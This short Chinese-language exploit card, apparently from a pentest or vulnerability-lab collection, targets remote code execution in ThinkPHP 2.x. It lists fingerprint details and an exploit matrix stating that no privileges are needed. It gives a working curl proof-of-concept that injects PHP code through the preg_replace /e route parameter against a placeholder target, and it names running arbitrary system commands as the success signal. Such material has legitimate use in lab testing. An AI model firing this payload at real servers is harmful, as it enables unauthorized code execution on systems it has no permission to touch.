# ThinkPHP 2.x RCE (2-rce)

## 指纹特征
- 服务: ThinkPHP 2.x
- 端口: 8080 (默认)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 正则表达式注入 | `/index.php` | 无 |

## PoC 指令

通过构造包含 `preg_replace` `/e` 修正符的路由参数执行 PHP 代码：

```bash
curl http://{{TARGET}}:8080/index.php?s=/Index/Index/name/${@phpinfo()}
```

## Success Signal
- **状态验证**: 执行 `phpinfo()` 并返回配置信息。
- **物理验证**: 执行任意系统命令 (如 `touch /tmp/success`)。
